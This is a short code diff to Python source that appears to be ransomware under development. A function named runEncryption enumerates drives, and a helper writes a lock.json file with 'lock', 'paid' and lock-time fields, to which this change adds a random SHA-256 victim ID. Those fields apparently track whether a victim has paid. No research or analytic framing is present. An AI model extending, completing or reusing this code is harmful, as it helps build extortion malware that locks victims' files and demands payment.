@@ -32,12 +32,18 @@ class __createFile:
     def __init__(self,path):
         self.path = path
 
-    def checkfile(self,fileName):
+    def checkfile(self,fileName,length=16):
         rmfilePath = self.path + "/" + fileName
+
+        letters_and_digits = string.ascii_letters + string.digits
+        random_string = ''.join(random.choice(letters_and_digits) for _ in range(length))
+        id = hashlib.sha256(random_string.encode()).hexdigest()
+
         data = {
             "lock":1,
             "paid":0,
-            "lockTime":datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            "lockTime":datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+            "UID":id
             }
         with open(rmfilePath,"w") as file:
             json.dump(data,file,indent=4)
@@ -88,7 +94,6 @@ def runEncryption():
 
     __cf = __createFile(testPath)
     __cf.checkfile("lock.json")
-    __cf.randomID("id.json")
     drives = _getAvaiblableDrives()
     print(drives)
 
